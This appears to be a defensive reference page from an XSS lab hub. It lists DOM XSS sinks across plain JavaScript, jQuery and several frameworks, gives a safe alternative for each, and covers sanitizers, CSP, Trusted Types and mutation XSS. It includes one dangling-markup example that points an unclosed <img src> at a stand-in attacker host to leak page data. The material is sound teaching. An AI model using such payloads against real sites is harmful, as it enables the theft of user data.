Sinks

A sink is a function or property that can turn a string into running code or live HTML. Data from a source is only dangerous once it reaches one of these.

HTML sinks: the string is parsed as HTML

SinkNotesSafe alternativeLab
element.innerHTML <script> does not run, but <img onerror> and similar do. textContent 01, 05, 06, 07
element.outerHTML, insertAdjacentHTML() Same behaviour as innerHTML. textContent, createElement -
document.write(), writeln() Runs while the page loads. <script> tags do run. Avoid entirely. 02
iframe.srcdoc A full HTML document, scripts run, same origin as the parent. sandbox attribute, escape the input 08

jQuery sinks

SinkNotesSafe alternativeLab
.html(), .append(), .prepend(), .after(), .before(), .replaceWith(), .wrap(), .wrapAll(), .add() A string argument is parsed as HTML. jQuery also runs any <script> tags in it. .text(), or build elements then use .text() 11, 12
$(string) Selector or HTML, depending on the string. jQuery 1.6.1 treated #<img> as HTML (CVE-2012-6708); fixed for good by 1.9, which requires the string to start with <. Validate the string, upgrade jQuery 13
jQuery.parseHTML(), $.parseHTML() Builds a hidden <div> and sets its innerHTML to the string, the same browser-parsing sink as innerHTML itself, just reached through jQuery's own helper. Don't parse untrusted strings as HTML at all -
jQuery.globalEval() Runs a string as JavaScript in the global scope. Functionally the same as eval(). Never call this on untrusted data -
.attr("href" | "src" | "action", value) Same risk as setting the property directly. Allow only http: and https: 14

Modern Angular sinks

SinkNotesSafe alternativeLab
[innerHTML], [innerText], [href], [src]... Angular sanitizes these template bindings automatically. Nothing to do here. (this is already the safe default) 18

More framework sinks

Different names, same shape every time: a framework's default is safe (usually plain text, HTML-encoded), and it gives you exactly one clearly-named way to turn that off per element. The bug is always using that one way on data that didn't need it.

SinkNotesSafe alternativeLab
dangerouslySetInnerHTML (React) Takes { __html: string } and sets real innerHTML. The awkward name is deliberate, so it's easy to grep for in review. Pass the string as a normal child instead 22
v-html (Vue) Vue's own docs warn against using it with untrusted content. {{ }} interpolation 23
{{{ }}} triple-stache (Handlebars, and Mustache.js which uses the same syntax) Double braces HTML-encode; one extra brace turns that off. {{ }} (double braces) 24
_.template() with <%= %> "interpolate" (Lodash/Underscore) No encoding at all. Easy to mix up with Handlebars: here <%- %> is the safe, HTML-encoding one, the opposite naming convention from the double/triple-brace engines above. <%- %> "escape" 25
data-bind="html: ..." (Knockout) Knockout's docs call this out directly as an XSS risk with untrusted input. data-bind="text: ..." 26
x-html (Alpine.js) Same idea as v-html and Knockout's html binding, in a smaller, no-build framework. x-text 27

A sink that isn't about code injection

SinkNotesSafe alternativeLab
document.domain = value The browser only accepts a value that is a valid parent domain of the current page (a.b.example.com can set it to example.com, nothing else), so this isn't an injection sink like the others on this page. It's still worth knowing: setting it relaxes the same-origin policy between sibling subdomains, so a bug that lets an attacker reach this call at all can let a compromised subdomain read or script this page. The setter is now deprecated, and does nothing at all on a page that sends Cross-Origin-Opener-Policy / Cross-Origin-Embedder-Policy, or an Origin-Agent-Cluster header, which modern sites are increasingly expected to. Avoid setting it; if subdomains must share access, prefer postMessage with an origin check -

Mitigations: things that stop a sink from firing

Everything above is "here's the bug." These are the real defenses, each verified against this exact browser rather than taken on faith, and each with a working lab you can try.

MitigationWhat it actually doesLab
DOMPurify (or a similar sanitizing library) Parses untrusted HTML and strips anything dangerous before it reaches a sink. The right fix when you need to allow some real HTML, not just plain text. 28
Content-Security-Policy, script-src Blocks inline event handlers (onerror=), inline <script> blocks, and javascript: URLs unless explicitly allowed. Real, meaningful protection against the classic payloads used throughout this hub. 31
Content-Security-Policy's blind spot: dangling markup script-src only governs script execution. An unterminated HTML attribute (an <img src="https://attacker.example/leak?data= with no closing quote) can still swallow the rest of the page's markup, including secrets, and exfiltrate it as part of a real network request — no script involved, so CSP never sees it. 32
Trusted Types, require-trusted-types-for 'script' Goes further than CSP: the browser refuses a plain string at innerHTML (and several other sinks) entirely, throwing before its HTML parser ever runs on untrusted input. Closes the dangling-markup gap above, since there's no parsed HTML to dangle in the first place. Chrome/Edge have supported it since 2020; Safari added it in version 26 (September 2025) and Firefox in version 148 (February 2026), which made it a Baseline feature — supported across all major engines, not just Chromium, as of this write-up. A library needs to be built for it too, not just your own code: jQuery 3.7.1 fails to even load on a page enforcing it (its own internal setup code hits the same wall), fixed in jQuery 4.0, which added Trusted Types support throughout. 33, 35

Mutation XSS (mXSS) and raw-text element confusion

TechniqueWhat it actually doesLab
Raw-text element confusion ("consuming tag") Elements like <style>, <noscript>, <script>, <iframe>, <xmp>, <title>, <textarea>, <noembed>, and <noframes> are RAWTEXT in the HTML spec: nothing that parses them pays attention to quotes or nested tags inside, it just scans for the literal next closing tag. A fake closing tag planted inside what looks like a quoted attribute value ends the element early and exposes real markup. This is the same mechanism behind real, named mXSS CVEs: Mozilla's Bleach sanitizer (CVE-2020-6802) and the browser's own DOMParser API (CVE-2021-23974) were both filed specifically over <noscript> handling. Verified directly: the payload fires, and a filter that only checks the first tag name misses it entirely. 34

What that lab demonstrates end to end is the simpler half of mXSS: the raw-text mechanism defeating a filter that pattern-matches text instead of parsing real HTML, with no sanitizer or second parse involved. The fuller, classic mXSS shape, something that checks untrusted HTML parses it one way, and whatever inserts it parses the same markup differently, needing no filter mistake at all, is real (those CVEs exist) but delicate to reproduce. We tested it directly: DOMParser genuinely does parse <noscript> differently from innerHTML in this browser, matching the CVEs' premise, but a sanitizer using DOMParser has to serialize its result back into a string before the real sink ever sees it, and that step HTML-encodes the characters this exact payload needs — so it doesn't survive the round trip. The divergence is real and confirmed; this specific payload isn't the one that exploits it end to end. Several other classic, specifically mXSS-labeled payloads from Mario Heiderich and Cure53's research (SVG/MathML namespace-confusion tricks) also didn't reproduce in current Chromium when tested directly. A fully verified, working, end-to-end mXSS sanitizer bypass isn't in this hub yet; revisit if one turns up.
